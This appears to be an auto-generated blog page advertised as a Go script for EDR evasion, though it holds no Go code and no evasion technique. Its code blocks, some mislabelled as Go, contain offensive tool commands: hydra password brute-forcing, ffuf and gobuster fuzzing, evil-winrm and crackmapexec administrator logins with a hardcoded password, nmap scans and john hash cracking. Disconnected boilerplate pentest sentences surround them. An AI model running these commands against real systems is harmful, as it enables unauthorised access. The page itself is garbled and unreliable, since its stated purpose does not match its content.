---
TitleSEO: "EDR Evasion Techniques in Go | ZureFX"
TitlePost: "EDR Evasion Techniques — Go"
Author: "ZureFX"
Description: "A Go script for edr evasion techniques. Built for security research and automation."
Keywords: "script, python, c, go, fuzzer"
URL: "https://zurefx.github.io/scripting/script-edr-evasion-techniques-548.html"
URL_IMAGES: ""
Date: "2025-11-02"
Tags: "Script, Python, C, Go, Fuzzer"
Section: "scripting"
Lang: "en"
main_img: "script-edr-evasion-techniques-548"
Permalink: "/scripting/script-edr-evasion-techniques-548.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `socat`
- `crackmapexec`
- `sqlmap`

## Implementation

### Core Logic

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.43.131.165 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.111.225.182/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

```go
gobuster dir -u http://10.106.148.12/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
evil-winrm -i 10.111.174.203 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.62.53.70 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
nmap -sCV -p80,5432,443 10.104.105.201 -oN scan.txt
nmap -sCV -p3306,143,21 10.26.206.96 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 10.65s
```
